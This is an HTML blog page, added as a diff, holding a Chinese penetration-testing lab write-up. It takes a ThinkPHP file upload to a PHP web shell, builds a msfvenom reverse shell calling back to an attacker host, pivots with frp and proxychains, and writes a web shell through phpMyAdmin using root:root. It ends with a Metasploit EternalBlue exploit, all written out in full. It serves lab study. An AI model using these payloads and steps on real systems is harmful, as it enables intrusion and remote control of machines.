@@ -1,0 +1,358 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>渗透靶场日记 02 | 『1nv_qaq&#39;s Blog』</title>
+    <meta name="author" content="1nv-qaq" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>wait wait wait...</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>『1NV_QAQ&#39;S BLOG』</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;『1NV_QAQ&#39;S BLOG』</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>渗透靶场日记 02</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/11/25
+        </span>
+        
+        <span class="category">
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                渗透测试
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="color: #00bcd4">
+                    渗透测试
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>复健另一套渗透靶场🎯</p>
+<span id="more"></span>
+
+<p>网络拓扑结构如下：</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/01.png" alt="img"></p>
+<p>门户网站<code>192.168.1.54</code>，<code>nmap</code>扫一下</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/02.png" alt="img"></p>
+<p>dirsearch扫入口点<code>python3 dirsearch.py -u 192.168.1.54 -F -e php</code></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/03.png" alt="img"></p>
+<p>得到<code>/shop</code>，<code>ThinkPHP5.0</code>，修改头像上传图片的地方就有文件上传的漏洞，<code>1.png</code>写一句话马进去</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/04.png" alt="img"></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/05.png" alt="img"></p>
+<p>改后缀为<code>.php</code>重发包，响应数据包看到上传路径<code>/shop/upload/avator/20241111191152329.php</code></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/06.png" alt="img"></p>
+<p><code>AntSword</code>连上看看操作系统版本信息</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/07.png" alt="img"></p>
+<p>接着想利用<code>msfconsole</code>写个<code>shell.elf</code>进去（<code>4444</code>端口，本地kali ip为<code>88.88.88.88</code>）</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/08.png" alt="img"></p>
+<pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=88.88.88.88 lport=4444 -f elf &gt; shell.elf
+</code></pre>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/09.png" alt="img"></p>
+<p><code>shell.elf</code>传到<code>/var/www/html/shop/upload/avator/</code>目录下</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/10.png" alt="img"></p>
+<p>赋权限执行后，<code>MSF</code>成功接收<code>shell</code></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/11.png" alt="img"></p>
+<p>接着扫内网存活情况，仍然传到<code>/var/www/html/shop/upload/avator/</code>目录下</p>
+<p><code>IPscan.sh</code></p>
+<pre><code class="shell">#!/bin/bash
+for ip in 192.168.1.&#123;1..254&#125;
+do
+    ping $ip -c 1 &amp;&gt; /dev/null
+        if [ $? -eq 0 ];then
+            echo &quot;$ip is alive .... &quot; &gt; ip_result.txt
+            echo $ip is alive ....
+        fi
+done
+</code></pre>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/12.png" alt="img"></p>
+<p>扫到<code>192.168.1.182</code>IP，猜测对应网络拓扑中的“数据库服务器”</p>
+<p><code>NetScan.sh</code></p>
+<pre><code class="shell">#!/bin/bash
+for ip in 192.168.&#123;1..10&#125;.1
+do
+    ping $ip -c 1 &amp;&gt; /dev/null
+        if [ $? -eq 0 ];then
+            echo &quot;$ip is alive .... &quot; &gt; ip_result.txt
+            echo $ip is alive ....
+        fi
+done
+</code></pre>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/13.png" alt="img"></p>
+<p>发现存活网段<code>192.168.2.0/24</code>，改一下<code>IPscan.sh</code>扫2段网络</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/14.png" alt="img"></p>
+<p><code>.106</code>和<code>.201</code>猜测对应网络拓扑中主机A与主机B</p>
+<p>传<code>frpc</code>和<code>frpc.ini</code>搭建内网隧道</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/15.png" alt="img"></p>
+<p>和上一套渗透一样，<code>vim /etc/proxychains.conf</code>开启<code>dynamic_chain</code>添加<code>socks5 127.0.0.1 9998</code></p>
+<p>使用代理<code>nmap</code>扫描</p>
+<p><code>192.168.1.182</code>的开放端口<code>proxychains4 nmap -Pn -sT 192.168.1.182</code>，开放<code>22</code>、<code>80</code>、<code>3306</code>端口</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/16.png" alt="img"></p>
+<p><code>192.168.2.106</code>的开放端口<code>proxychains4 nmap -Pn -sT 192.168.2.106</code>，<code>80</code>，<code>135</code>，<code>139</code>，<code>445</code>，<code>3306</code>，<code>3389</code>端口开放</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/17.png" alt="img"></p>
+<p><code>firefox</code>配置代理，登进<code>192.168.2.106:80</code>内网</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/18.png" alt="img"></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/19.png" alt="img"></p>
+<p><code>proxychain python3 dirsearch.py -u 192.168.2.106:80 -e *</code></p>
+<p>扫到<code>/phpmyadmin</code>路由</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/20.png" alt="img"></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/21.png" alt="img"></p>
+<p>弱密码<code>root:root</code>登入，在<code>typecho</code>数据库执行<code>select @@basedir</code>查看数据库安装路径</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/22.png" alt="img"></p>
+<p>发现是<code>phpstudy</code>建的站，去<code>www</code>目录下写马</p>
+<pre><code class="SQL">select &#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39; into outfile &#39;c:/phpstudy/www/11.php&#39;;
+</code></pre>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/23.png" alt="img"></p>
+<p>成功上线</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/24.png" alt="img"></p>
+<p><code>192.168.2.201</code>的开放端口<code>proxychains4 nmap -Pn -sT 192.168.2.201</code></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/25.png" alt="img"></p>
+<p><code>445</code>端口开放怀疑存在永恒之蓝（ms17010）漏洞，首先检测是否存在</p>
+<pre><code class="Shell">proxychains msfconsole
+use auxiliary/scanner/smb/smb_ms17_010
+set rhosts 192.168.2.201
+run
+</code></pre>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/26.png" alt="img"></p>
+<p>打完收工</p>
+<pre><code class="Shell">use exploit/windows/smb/ms17_010_eternalblue
+set lhost 88.88.88.88
+set rhosts 192.168.2.201
+set payload windows/x64/meterpreter/bind_tcp
+run
+</code></pre>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/27.png" alt="img"></p>
+<p>漏洞都有点入门级别了，打着玩了就当</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2002/28.png" alt="img"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2024 - 2024 『1nv_qaq&#39;s Blog』
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;1nv-qaq
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    <script src="/js/<fireworks.min.js>"></script>
+
+
+    <canvas
+    id="fireworks"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767"
+></canvas>
+<script src="https://s4.zstatic.net/ajax/libs/animejs/3.2.1/anime.min.js"></script>
+<script src="/js/fireworks.min.js"></script>
+
+
+
+
+    
+    
+
+
+
+
+    
+</body>
+</html>
